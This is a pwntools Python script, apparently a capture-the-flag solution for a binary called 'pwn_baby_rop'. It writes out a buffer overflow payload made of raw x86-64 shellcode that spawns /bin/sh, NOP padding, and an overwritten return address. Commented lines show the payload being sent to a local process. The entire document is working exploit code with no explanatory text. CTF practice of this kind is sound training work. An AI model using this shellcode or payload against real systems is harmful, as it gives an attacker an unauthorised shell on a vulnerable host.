from pwn import *
import pwn

def main():
    # target = process("./pwn_baby_rop")
    # target.recvline();
    shellcode_addr = 0x000000404060
    shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    return_addr_offset = 248-len(shellcode)


    padding = b"\x90" * ( return_addr_offset + 16)
    # print("shellcode at addr + ", p64(shellcode_addr))
    payload = shellcode + padding + p64(shellcode_addr)
    sys.stdout.buffer.write(payload)
    # target.sendline(payload)
    # gdb.attach(target, gdbscript="b *0x00404060")
    # target.interactive()

main()
